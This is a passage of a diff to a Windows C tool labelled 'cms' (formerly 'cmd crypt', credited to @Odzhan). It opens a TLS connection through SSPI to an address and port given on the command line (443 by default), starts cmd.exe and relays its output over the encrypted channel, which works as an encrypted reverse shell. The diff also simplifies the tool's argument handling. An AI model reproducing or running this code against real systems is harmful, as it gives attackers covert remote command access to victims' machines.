            
             // data from cmd.exe?
             if (e == stdout_evt) 
             {
-              if (p == 0)  // still waiting for previous read to complete?
+              if (p==0)  // still waiting for previous read to complete?
               {
-                ReadFile (lh[2], pbData, BUFSIZ, &cbData, &lap);
-                p++;
+                if (!ReadFile (out[R_PIPE], pbDataOut, cbBufferLen, &cbDataOut, &lap))
+                {
+                  if (GetLastError() != ERROR_IO_PENDING)
+                  {
+                    // problem...
+                    break;
+                  } else {
+                    p++;
+                  }
+                } else {
+                  p++;
+                }
               } else {
-                if (!GetOverlappedResult (lh[2], &lap, &cbData, FALSE)) {
+                if (!GetOverlappedResult (out[R_PIPE], &lap, &cbDataOut, FALSE)) {
+                  // problem...
                   break;
                 }
-              }
-              if (cbData != 0)
-              {
-                if (ssl_send() != SEC_E_OK) 
-                  break;
-                p--;
+                if (cbDataOut != 0)
+                {
+                  if (ssl_send() != SEC_E_OK) 
+                    break;
+                  p--;
+                }
               }
             }
           } while (1);
+          
           TerminateProcess (pi.hProcess, 0);
           
           CloseHandle (pi.hThread);
           CloseHandle (pi.hProcess);
           evt_cnt--;
         }
-        CloseHandle (lh[3]);
+        CloseHandle (out[W_PIPE]);
       }
-      CloseHandle (lh[2]);
+      CloseHandle (out[R_PIPE]);
     }
-    CloseHandle (lh[1]);
-    CloseHandle (lh[0]);
+    CloseHandle (in[W_PIPE]);
+    CloseHandle (in[R_PIPE]);
   }
   CloseHandle (evt[stdout_evt]);
   evt_cnt--;
 }
 
+char* getparam (int argc, char *argv[], int *i)
+{
+  int n=*i;
+  if (argv[n][2] != 0) {
+    return &argv[n][2];
+  }
+  if ((n+1) < argc) {
+    *i=n+1;
+    return argv[n+1];
+  }
+  printf ("  [ %c%c requires parameter\n", argv[n][0], argv[n][1]);
+  exit (0);
+}
+
+void usage (void) 
+{ 
+  int i;
+  
+  printf ("\n  usage: cms <address> [options]\n");
+  printf ("\n  -4           Use IP version 4 (default)");
+  printf ("\n  -6           Use IP version 6");
+  printf ("\n  -p <number>  Port number to use (default is 443)");
+  printf ("\n\n  Press any key to continue . . .");
+  getchar ();
+  exit (0);
+}
+
+// parse the arguments on command line
+void parse_args (int argc, char *argv[])
+{
+  int  i;
+  char opt;
+  
+  // for each argument
+  for (i=1; i<argc; i++)
+  {
+    // is this option?
+    if (argv[i][0]=='-' || argv[i][1]=='/')
+    {
+      // get option value
+      opt=argv[i][1];
+      switch (opt)
+      {
+        case '4':
+          args.ai_family=AF_INET;
+          break;
+        case '6':     // use ipv6 (default is ipv4)
+          args.ai_family=AF_INET6;
+          break;
+        case 'p':     // port number
+          args.port=getparam(argc, argv, &i);
+          args.port_nbr=atoi(args.port);
+          break;
+        case '?':     // display usage
+        case 'h':
+          usage ();
+          break;
+        default:
+          printf ("  [ unknown option %c\n", opt);
+          break;
+      }
+    } else {
+      // assume it's host name or IP
+      args.address=argv[i];
+    }
+  }
+}
 
 int main (int argc, char *argv[])
 {
@@ -881,18 +869,13 @@ int main (int argc, char *argv[])
   // set buffer width of console
   setw (300);
   
-  puts ("\n  [ cmd crypt v0.1 - Copyleft 2015 (x) @Odzhan\n");
+  puts ("\n  [ cms v0.1 - Copyleft 2015 (x) @Odzhan\n");
   
   // set up default values
-  args.mode      = CLIENT_MODE;
-  args.xchg_type = RSA_KEY_XCHG;
-  args.xchg_len  = 1024;
   args.address   = NULL;
   args.ai_family = AF_INET;
   args.port      = DEFAULT_PORT;
   args.port_nbr  = atoi(args.port);
-  args.enc_nbr   = 7;   // AES-256
-  args.enc_id    = CALG_AES_256;
   
   pInitSecurityInterface = (INIT_SECURITY_INTERFACE)GetProcAddress(LoadLibrary("Secur32"), "InitSecurityInterfaceA" );
   if (pInitSecurityInterface==NULL) printf ("didn't resolve");
@@ -901,41 +884,42 @@ int main (int argc, char *argv[])
   // process command line
   parse_args(argc, argv);
 
-  // validate options provided
-  if (validate_args ()) {
-    // resolve address and open socket
-    if (open_tcp ()) {
-      display_args();
-      start_handler ();
+  // resolve address and open socket
+  if (open_tcp ()) 
+  {
+    start_handler ();
       
-      // create credentials
-      if (create_creds()==SEC_E_OK)
-      {
-        // connect to server
-        if (connect (s, ai_addr, ai_addrlen) != SOCKET_ERROR) {
-          // perform the handshake
-          if (chs () == SEC_E_OK) {
-            // send something
-            secure_info();
-            ss=sspi->QueryContextAttributes (&hContext, SECPKG_ATTR_STREAM_SIZES, &Sizes );
-            cbIoBufferLength = Sizes.cbHeader  +  Sizes.cbMaximumMessage  +  Sizes.cbTrailer;
-            pbIoBuffer       = LocalAlloc(LMEM_FIXED, cbIoBufferLength);
-            pbData=pbIoBuffer + Sizes.cbHeader;
+    // create credentials
+    if (create_creds()==SEC_E_OK)
+    {
+      // connect to server
+      if (connect (s, ai_addr, ai_addrlen) != SOCKET_ERROR) {
+        // perform the handshake
+        if (chs () == SEC_E_OK) {
+          printf ("  [ connected\n\n");
+          secure_info();
+          ss=sspi->QueryContextAttributes (&hContext, SECPKG_ATTR_STREAM_SIZES, &Sizes );
+          cbBufferLen  = Sizes.cbHeader  +  Sizes.cbMaximumMessage  +  Sizes.cbTrailer;
+          pbBufferIn        = LocalAlloc(LMEM_FIXED, cbBufferLen);
+          pbBufferOut       = LocalAlloc(LMEM_FIXED, cbBufferLen);
+          pbDataIn=pbBufferIn + Sizes.cbHeader;
+          pbDataOut=pbBufferOut + Sizes.cbHeader;
+          cbBufferLen = Sizes.cbMaximumMessage;
+          
+          printf ("  [ running cmd\n");
+          cmd();
             
-            cmd();
-            
-          } else {
-            printf ("  [ handshake failed\n");
-          }
         } else {
-          printf ("  [ unable to connect\n");
+          printf ("  [ handshake failed\n");
         }
       } else {
-        printf ("  [ error creating credentials\n");
+        printf ("  [ unable to connect\n");
       }
-      stop_handler ();
-      close_tcp();
+    } else {
+      printf ("  [ error creating credentials\n");
     }
+    stop_handler ();
+    close_tcp();
   }
   return 0;
 }
